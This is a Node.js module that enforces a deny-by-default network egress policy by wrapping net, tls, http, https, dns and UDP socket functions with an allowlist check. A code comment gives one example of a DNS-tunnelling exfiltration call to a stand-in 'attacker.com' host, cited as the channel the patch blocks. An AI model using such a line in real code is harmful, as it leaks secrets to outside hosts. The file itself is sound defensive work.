const dgram = require('node:dgram');
const dns = require('node:dns');
const http = require('node:http');
const https = require('node:https');
const net = require('node:net');
const tls = require('node:tls');

const MODE = process.env.KOVO_EGRESS_MODE ?? 'deny';
const ALLOWLIST = parseAllowlist(process.env.KOVO_EGRESS_ALLOWLIST ?? '');
const LOCAL_HOSTNAMES = new Set(['localhost']);

function parseAllowlist(text) {
  return text
    .split(',')
    .map((value) => value.trim().toLowerCase())
    .filter(Boolean);
}

function normalizeHost(host) {
  if (typeof host !== 'string') return null;
  const trimmed = host.trim().toLowerCase();
  if (!trimmed) return null;
  if (trimmed.startsWith('[') && trimmed.endsWith(']')) return trimmed.slice(1, -1);
  return trimmed;
}

function isLoopbackHost(host) {
  const normalized = normalizeHost(host);
  if (!normalized) return false;
  return (
    LOCAL_HOSTNAMES.has(normalized) ||
    normalized === '::1' ||
    normalized === '0.0.0.0' ||
    normalized.startsWith('127.')
  );
}

function isAllowedHost(host, allowlist = ALLOWLIST) {
  const normalized = normalizeHost(host);
  if (!normalized) return false;
  if (isLoopbackHost(normalized)) return true;
  return allowlist.some((entry) => {
    if (entry.startsWith('*.')) {
      const suffix = entry.slice(1);
      return normalized.endsWith(suffix) && normalized !== suffix.slice(1);
    }
    return normalized === entry;
  });
}

function describeAllowlist(allowlist = ALLOWLIST) {
  return allowlist.length === 0 ? 'none (deny-all mode)' : allowlist.join(', ');
}

function describeTarget(target) {
  if (target.path) return `unix:${target.path}`;
  if (target.host && target.port !== undefined) return `${target.host}:${target.port}`;
  if (target.host) return target.host;
  return 'unknown target';
}

function blockedError(channel, target, allowlist = ALLOWLIST) {
  const error = new Error(
    `KOVO egress floor blocked ${channel} to ${describeTarget(target)}; allowed hosts: ${describeAllowlist(
      allowlist,
    )}`,
  );
  error.code = 'KOVO_EGRESS_DENIED';
  return error;
}

function assertAllowed(channel, target, allowlist = ALLOWLIST) {
  if (MODE === 'off') return;
  if (target.path) return;
  if (isAllowedHost(target.host, allowlist)) return;
  throw blockedError(channel, target, allowlist);
}

function targetFromNetArgs(args) {
  const [first, second] = args;
  if (typeof first === 'object' && first !== null) {
    if (typeof first.path === 'string') return { path: first.path };
    return { host: normalizeHost(first.host ?? first.hostname), port: first.port };
  }
  if (typeof first === 'string' && Number.isNaN(Number(first))) {
    return { path: first };
  }
  return { host: normalizeHost(second), port: first };
}

function targetFromHttpArgs(args, defaultPort) {
  const [first, second] = args;
  if (first instanceof URL) {
    return {
      host: normalizeHost(first.hostname),
      port: first.port ? Number(first.port) : defaultPort,
    };
  }
  if (typeof first === 'string') {
    const url = new URL(first);
    return { host: normalizeHost(url.hostname), port: url.port ? Number(url.port) : defaultPort };
  }
  if (typeof first === 'object' && first !== null) {
    if (typeof first.socketPath === 'string') return { path: first.socketPath };
    return {
      host: normalizeHost(first.hostname ?? first.host),
      port: first.port ?? defaultPort,
    };
  }
  if (typeof second === 'object' && second !== null) {
    if (typeof second.socketPath === 'string') return { path: second.socketPath };
    return {
      host: normalizeHost(second.hostname ?? second.host),
      port: second.port ?? defaultPort,
    };
  }
  return { host: null, port: defaultPort };
}

// node:dns resolution functions all take the hostname (or, for reverse/
// lookupService, the address) as their first positional argument. Routing them
// through assertAllowed closes the DNS-tunnelling exfil channel (e.g.
// `dns.resolve(base32(secret) + '.attacker.com')`) that bypassed the
// connect-only floor — bugz-3 L7. Anything but a string first arg fails closed.
function targetFromDnsArgs(args) {
  const [first] = args;
  if (typeof first === 'string') return { host: normalizeHost(first) };
  return { host: null };
}

// node:dgram `Socket.prototype.send(msg[, offset, length][, port][, address][, cb])`
// and `Socket.prototype.connect(port[, address][, cb])` carry the destination
// host as the sole string argument after the leading positional (the message or
// port). When absent, Node defaults to loopback (127.0.0.1 / ::1), which the
// floor already permits — so blocking UDP exfil under the deny-all policy
// (bugz-3 L7) only needs the single string destination.
function targetFromDgramArgs(args) {
  const address = args.slice(1).find((value) => typeof value === 'string');
  if (address === undefined) return { host: 'localhost' };
  return { host: normalizeHost(address) };
}

// node:dns c-ares Resolver methods (also present on dns.promises.Resolver).
const DNS_RESOLVER_METHODS = [
  'resolve',
  'resolve4',
  'resolve6',
  'resolveAny',
  'resolveCaa',
  'resolveCname',
  'resolveMx',
  'resolveNaptr',
  'resolveNs',
  'resolvePtr',
  'resolveSoa',
  'resolveSrv',
  'resolveTxt',
  'reverse',
];

// Module-level node:dns (and dns.promises) functions: the Resolver methods plus
// the getaddrinfo-backed lookup/lookupService that have no Resolver equivalent.
const DNS_MODULE_METHODS = ['lookup', 'lookupService', ...DNS_RESOLVER_METHODS];

function patchConnect(moduleName, targetFromArgs, source, keys) {
  if (!source) return;
  for (const key of keys) {
    const original = source[key];
    // Tolerate Node-version method drift: only wrap callable members so an
    // absent name can never silently disable an existing interception.
    if (typeof original !== 'function') continue;
    source[key] = function patchedConnect(...args) {
      assertAllowed(`${moduleName}.${key}`, targetFromArgs(args));
      return original.apply(this, args);
    };
  }
}

patchConnect('net', targetFromNetArgs, net, ['connect', 'createConnection']);
patchConnect('tls', targetFromNetArgs, tls, ['connect']);
patchConnect('http', (args) => targetFromHttpArgs(args, 80), http, ['request', 'get']);
patchConnect('https', (args) => targetFromHttpArgs(args, 443), https, ['request', 'get']);

// DNS (c-ares + getaddrinfo) and UDP are whole protocol families that bypassed
// the connect-only floor; route them through the same assertAllowed sink so the
// deny-all build/publish policy blocks DNS-tunnelling and UDP exfil while an
// explicit allowlist host still resolves. SPEC.md §744 rule 3 / §746: outbound
// egress is a fail-closed runtime defense-in-depth floor, not a by-construction
// proof. Module-level functions are bound to the default resolver at load, so
// the Resolver prototypes must be patched independently for `new dns.Resolver()`.
patchConnect('dns', targetFromDnsArgs, dns, DNS_MODULE_METHODS);
patchConnect('dns.Resolver', targetFromDnsArgs, dns.Resolver?.prototype, DNS_RESOLVER_METHODS);
const dnsPromises = dns.promises;
patchConnect('dns.promises', targetFromDnsArgs, dnsPromises, DNS_MODULE_METHODS);
patchConnect(
  'dns.promises.Resolver',
  targetFromDnsArgs,
  dnsPromises && dnsPromises.Resolver?.prototype,
  DNS_RESOLVER_METHODS,
);
patchConnect('dgram.Socket', targetFromDgramArgs, dgram.Socket?.prototype, ['send', 'connect']);

module.exports = {
  MODE,
  assertAllowed,
  blockedError,
  describeAllowlist,
  isAllowedHost,
  isLoopbackHost,
  normalizeHost,
  parseAllowlist,
  targetFromDgramArgs,
  targetFromDnsArgs,
  targetFromHttpArgs,
  targetFromNetArgs,
};
